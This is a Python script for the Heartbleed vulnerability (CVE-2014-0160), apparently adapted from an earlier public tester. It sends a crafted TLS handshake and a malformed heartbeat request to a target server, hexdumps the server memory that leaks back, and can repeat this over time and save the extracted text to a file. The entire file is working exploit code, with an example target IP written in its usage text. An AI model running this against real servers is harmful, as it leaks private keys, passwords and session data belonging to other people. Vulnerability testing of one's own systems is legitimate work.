# Demonstration of CVE-2014-0160 by James Adcock adapted from script written by Jared Stafford
# Added functionality to run recursively and write human readable data to file, also able to run as windows exe
# with limited functionality, run 'python setup.py py2exe to convert to windows executable
# The author disclaims copyright to this source code.

import sys
import struct
import socket
import time
import select
import codecs
from optparse import OptionParser

decode_hex = codecs.getdecoder('hex_codec')
description = 'Test for SSL heartbeatvulnerability (CVE-2014-0160), usage example: Heartbleeder.py 54.217.122.251'
options = OptionParser(usage='%prog server [options]', description=description)
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
options.add_option('-s', '--starttls', action='store_true', default=False, help='Check STARTTLS')
options.add_option('-d', '--debug', action='store_true', default=False, help='Enable debug output')
options.add_option('-t', '--time', help='Amount of time in seconds to run', default=1)
options.add_option('-i', '--interval', help='Interval between requests', default=1)
options.add_option('-f', '--file', action='store_true', default=False, help='Write human readable output to "data.txt" file')



#Create file to 'data.txt'
def create_file():
    with open('data.txt', 'w') as file:
        file.write('')

#Append to file data.txt
def append_file(data):
    with open('data.txt', 'a') as file:
        file.write(data)

#convert hexadecimal to binary
def h2bin(x):
        return decode_hex(x.replace(' ', '').replace('\n', ''))[0]

hello = h2bin('''
        16 03 02 00  dc 01 00 00 d8 03 02 53
        43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
        bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
        00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
        00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
        c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
        c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
        c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
        c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
        00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
        03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
        00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
        00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
        00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
        00 0f 00 01 01
        ''')


#convert binary to hexadecimal
hb = h2bin('''
        18 03 02 00 03
        01 40 00
        ''')

#dump data received to console and file if option -f is supplied
def hexdump(s, write_data_to_file):
    for b in range(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % c for c in lin)
        pdat = ''.join(chr(c) if 32 <= c <= 126 else '.' for c in lin)
        print('  %04x: %-48s %s' % (b, hxdat, pdat))
        if write_data_to_file:
            pdat = pdat.replace('.', '')
            data = pdat.replace(' ', '')
            append_file(data)



def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = b''
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            if not data:
                                return None
            rdata += data
            remain -= len(data)
    return rdata


def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        print( 'Unexpected EOF receiving record header - server closed connection')
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        print( 'Unexpected EOF receiving record payload - server closed connection')
        return None, None, None
    print( ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))
    return typ, ver, pay

# send heartbeat target
def hit_hb(s, opts):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            print( 'No heartbeat response received, server likely not vulnerable')
            return False

        if typ == 24:
            print('Received heartbeat response:')
            hexdump(pay, opts.file)
            if len(pay) > 3:
                print( 'WARNING: server returned more data than it should - server is vulnerable!')
            else:
                print( 'Server processed malformed heartbeat, but did not return any extra data.')
            return True

        if typ == 21:
            print( 'Received alert:')
            hexdump(pay)
            print( 'Server returned error, likely not vulnerable')

            return False


def run_exploit(opts, args):
    time_to_run = int(float(opts.time) / float(opts.interval))
    for i in range(0, int(time_to_run)):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print('Connecting...')
        sys.stdout.flush()
        sock.connect((args[0], opts.port))

        if opts.starttls:
            starttls(sock, opts.debug)

        print('Sending Client Hello...')
        sys.stdout.flush()
        sock.send(hello)
        print( 'Waiting for Server Hello...')
        sys.stdout.flush()
        while True:
            typ, ver, pay = recvmsg(sock)
            if typ == None:
                print( 'Server closed connection without sending Server Hello.')
                return
            # Look for server hello done message.
            if typ == 22 and pay[0] == 0x0E:
                break

        print( 'Sending heartbeat request...')
        sys.stdout.flush()
        sock.send(hb)
        if not hit_hb(sock, opts):
            exit()
        time.sleep(int(opts.interval))


def starttls(sock, debug):
    re = sock.recv(4096)
    if debug:
        print( re)
    sock.send(b'ehlo starttlstest\n')
    re = sock.recv(1024)
    if debug: print( re)
    if not b'STARTTLS' in re:
        if debug: print( re)
        print( 'STARTTLS not supported...')
        sys.exit(0)
    sock.send(b'starttls\n')
    re = sock.recv(1024)


def main():
    opts, args = options.parse_args()
    if len(args) < 1:
        args.append(input('Please enter target IP address: '))
    if opts.file:
        create_file();
    run_exploit(opts, args)
    input('Hit Return to exit')

if __name__ == '__main__':
        main()